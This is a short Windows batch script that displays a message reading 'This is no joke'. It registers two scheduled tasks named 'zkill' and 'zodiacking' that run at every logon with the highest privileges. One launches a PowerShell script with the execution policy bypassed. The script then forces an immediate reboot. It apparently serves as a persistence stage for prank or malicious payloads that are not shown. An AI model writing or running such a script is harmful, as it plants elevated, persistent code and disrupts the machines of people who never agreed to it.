@echo off

msg * This is no joke.
timeout /t 1

set TASKNAME=zkill
set SCRIPT1=%~dp0DesktopEffects.ps1
set SCRIPT2=%~dp0zkill.bat

schtasks /create /tn "%TASKNAME%" /tr "powershell.exe -ExecutionPolicy Bypass -File \"%SCRIPT1%\"" /sc onlogon /rl HIGHEST /f
schtasks /create /tn "zodiacking" /tr "cmd.exe /c \"%SCRIPT2%\"" /sc onlogon /rl HIGHEST /delay 0000:30 /f
shutdown /r /t 0 /f

